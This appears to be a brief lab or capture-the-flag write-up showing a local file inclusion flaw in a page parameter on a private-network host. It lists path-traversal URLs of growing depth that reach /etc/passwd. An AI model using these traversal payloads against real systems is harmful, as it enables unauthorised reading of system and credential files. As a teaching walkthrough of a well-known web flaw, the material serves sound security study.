# Local File Inclusion

We can see a query page in multiple url.

http://192.168.56.102/index.php?page=survey
http://192.168.56.102/index.php?page=member

The server probably loads a local file with a relative path.
We can use that breach to access to files at the root folder of the machine like /etc/passwd
to get some interesting informations.

Lets try this link:
http://192.168.56.102/index.php?page=../member

There is an alert that say "Wtf?"!!

We can try to access and go back to the parent directory.
Every time we had ../ the message is different.

http://192.168.56.102/index.php?page=../etc/passwd
http://192.168.56.103/index.php?page=../../etc/passwd
http://192.168.56.103/index.php?page=../../../etc/passwd
http://192.168.56.103/index.php?page=../../../../etc/passwd
http://192.168.56.103/index.php?page=../../../../../etc/passwd
http://192.168.56.103/index.php?page=../../../../../../etc/passwd
http://192.168.56.103/index.php?page=../../../../../../../etc/passwd

**We got it!!**

## External Resources
https://book.hacktricks.xyz/pentesting-web/file-inclusion
